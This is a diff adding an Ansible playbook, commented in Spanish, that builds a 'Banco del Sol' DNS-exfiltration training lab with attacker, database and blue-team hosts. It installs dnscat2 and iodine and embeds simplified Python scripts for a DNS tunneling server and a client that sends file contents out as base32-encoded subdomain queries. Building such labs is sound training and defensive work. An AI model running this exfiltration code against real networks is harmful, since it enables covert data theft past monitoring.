@@ -1,0 +1,266 @@
+---
+# ==============================================================================
+# Escenario Exfiltracion - Configuracion Base de Imagenes
+# ==============================================================================
+# Este playbook se ejecuta DURANTE la creacion de imagenes base (fase Packer).
+# Instala todas las dependencias que requieren conexion a internet.
+#
+# COMPONENTES INSTALADOS:
+#   1. attack-ws: dnscat2, dnsmasq, python3
+#   2. db-srv: iodine, python3, sshpass
+#   3. blue-team-ws: python3, tcpdump, tshark, net-tools
+# ==============================================================================
+
+- name: "Configurar attack-servidor DNS"
+  hosts: attack-ws
+  gather_facts: yes
+  become: yes
+  tasks:
+    - name: "Actualizar repositorios"
+      ansible.builtin.apt:
+        update_cache: yes
+        cache_valid_time: 3600
+      when: ansible_os_family == "Debian"
+
+    - name: "Instalar servidor DNS y herramientas"
+      ansible.builtin.package:
+        state: present
+        name:
+          - dnsmasq
+          - python3
+          - python3-pip
+          - net-tools
+          - nmap
+          - socat
+          - screen
+
+    - name: "Compilar dnscat2 desde fuente"
+      ansible.builtin.shell: |
+        cd /opt
+        git clone https://github.com/iagox86/dnscat2.git 2>/dev/null || true
+        cd dnscat2
+        make 2>/dev/null || echo "Compilacion omitida, usando version pre-compilada"
+      ignore_errors: yes
+
+    - name: "Instalar dnscat2 pre-compilado"
+      ansible.builtin.shell: |
+        if [ ! -f /usr/local/bin/dnscat2 ]; then
+          cd /tmp
+          wget -q https://github.com/iagox86/dnscat2/releases/download/v0.6.1/dnscat2_0.6.1_linux_x86_64 2>/dev/null || true
+          chmod +x dnscat2_0.6.1_linux_x86_64 2>/dev/null || true
+          cp dnscat2_0.6.1_linux_x86_64 /usr/local/bin/dnscat2 2>/dev/null || echo "Usando alternativa"
+        fi
+      ignore_errors: yes
+
+    - name: "Crear alternativa simple de dnscat2 con Python"
+      ansible.builtin.copy:
+        dest: /opt/dnscat2_server.py
+        mode: "0755"
+        content: |
+          #!/usr/bin/env python3
+          """
+          Servidor DNS Tunneling simplificado - Banco del Sol
+          Simula dnscat2 para fines educativos
+          """
+          import socket
+          import threading
+          import base64
+          import sys
+          import time
+
+          class DNSServer:
+              def __init__(self, host='0.0.0.0', port=53):
+                  self.host = host
+                  self.port = port
+                  self.data_chunks = []
+                  self.running = True
+
+              def start(self):
+                  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                  sock.bind((self.host, self.port))
+                  print(f"[*] Servidor DNS activo en {self.host}:{self.port}")
+                  print("[*] Esperando consultas DNS...")
+
+                  while self.running:
+                      try:
+                          sock.settimeout(1.0)
+                          data, addr = sock.recvfrom(512)
+                          self.handle_dns_query(data, addr, sock)
+                      except socket.timeout:
+                          continue
+                      except Exception as e:
+                          print(f"[!] Error: {e}")
+
+              def handle_dns_query(self, data, addr, sock):
+                  # Decodificar consulta DNS (simplificado)
+                  try:
+                      # Extraer subdominio de la consulta
+                      query = data[12:].decode('utf-8', errors='ignore').rstrip('\x00')
+                      if query:
+                          # Decodificar datos del subdominio
+                          try:
+                              decoded = base64.b32decode(query.split('.')[0])
+                              self.data_chunks.append(decoded)
+                              print(f"[+] Datos recibidos de {addr[0]}: {decoded[:50]}...")
+
+                              # Enviar respuesta DNS
+                              response = self.build_dns_response(data, "192.168.1.100")
+                              sock.sendto(response, addr)
+                          except:
+                              pass
+                  except:
+                      pass
+
+              def build_dns_response(self, request, ip_address):
+                  # Construir respuesta DNS basica
+                  response = bytearray(request)
+                  response[2] = 0x81  # Flags: Response
+                  response[3] = 0x80
+                  # Agregar registro A con IP
+                  response.extend(ip_address.encode())
+                  return bytes(response)
+
+              def save_exfiltrated_data(self, filename):
+                  with open(filename, 'wb') as f:
+                      for chunk in self.data_chunks:
+                          f.write(chunk)
+                  print(f"[+] Datos exfiltrados guardados en {filename}")
+
+          if __name__ == "__main__":
+              server = DNSServer()
+              try:
+                  server.start()
+              except KeyboardInterrupt:
+                  print("\n[*] Servidor detenido")
+                  server.save_exfiltrated_data("/opt/exfiltrated_data.txt")
+
+- name: "Configurar db-srv con datos exfiltrables"
+  hosts: db-srv
+  gather_facts: yes
+  become: yes
+  tasks:
+    - name: "Actualizar repositorios"
+      ansible.builtin.apt:
+        update_cache: yes
+        cache_valid_time: 3600
+      when: ansible_os_family == "Debian"
+
+    - name: "Instalar herramientas de tunneling DNS"
+      ansible.builtin.package:
+        state: present
+        name:
+          - python3
+          - python3-pip
+          - openssh-server
+          - net-tools
+          - dnsutils
+          - nmap
+
+    - name: "Instalar iodine (DNS tunneling)"
+      ansible.builtin.package:
+        state: present
+        name:
+          - iodine
+      ignore_errors: yes
+
+    - name: "Crear alternativa de iodine con Python"
+      ansible.builtin.copy:
+        dest: /opt/iodine_client.py
+        mode: "0755"
+        content: |
+          #!/usr/bin/env python3
+          """
+          Cliente DNS Tunneling simplificado - Banco del Sol
+          Simula iodine para fines educativos
+          """
+          import socket
+          import base64
+          import time
+          import sys
+
+          class DNSClient:
+              def __init__(self, dns_server, domain="bancodelsol.lab"):
+                  self.dns_server = dns_server
+                  self.domain = domain
+
+              def send_data(self, data):
+                  # Dividir datos en chunks de 63 bytes (limite DNS)
+                  chunk_size = 63
+                  chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
+
+                  print(f"[*] Enviando {len(chunks)} chunks via DNS...")
+
+                  for i, chunk in enumerate(chunks):
+                      # Codificar chunk en base32
+                      encoded = base64.b32encode(chunk).decode('ascii').rstrip('=')
+                      # Construir subdominio
+                      subdomain = f"{encoded}.{self.domain}"
+
+                      # Enviar consulta DNS
+                      self.send_dns_query(subdomain)
+                      time.sleep(0.1)  # Pequena pausa entre consultas
+
+                      if (i + 1) % 10 == 0:
+                          print(f"  [*] {i + 1}/{len(chunks)} chunks enviados...")
+
+                  print(f"[+] Todos los chunks enviados")
+
+              def send_dns_query(self, domain):
+                  try:
+                      # Usar nslookup para enviar consulta
+                      import subprocess
+                      subprocess.run(
+                          ['nslookup', domain, self.dns_server],
+                          capture_output=True,
+                          timeout=5
+                      )
+                  except:
+                      pass
+
+          if __name__ == "__main__":
+              if len(sys.argv) < 3:
+                  print("Uso: python3 iodine_client.py <dns_server> <archivo>")
+                  sys.exit(1)
+
+              dns_server = sys.argv[1]
+              filename = sys.argv[2]
+
+              client = DNSClient(dns_server)
+
+              with open(filename, 'r') as f:
+                  data = f.read()
+
+              print(f"[*] Exfiltrando {len(data)} bytes via DNS tunneling...")
+              client.send_data(data.encode())
+              print("[+] Exfiltracion completada")
+
+- name: "Configurar blue-team-ws para deteccion"
+  hosts: blue-team-ws
+  gather_facts: yes
+  become: yes
+  tasks:
+    - name: "Actualizar repositorios"
+      ansible.builtin.apt:
+        update_cache: yes
+        cache_valid_time: 3600
+      when: ansible_os_family == "Debian"
+
+    - name: "Instalar herramientas de analisis de trafico"
+      ansible.builtin.package:
+        state: present
+        name:
+          - python3
+          - python3-pip
+          - tcpdump
+          - tshark
+          - wireshark-common
+          - net-tools
+          - nmap
+          - dnsutils
+
+    - name: "Instalar librerias de Python para analisis"
+      ansible.builtin.pip:
+        name:
+          - scapy
+          - pyshark
+        executable: pip3
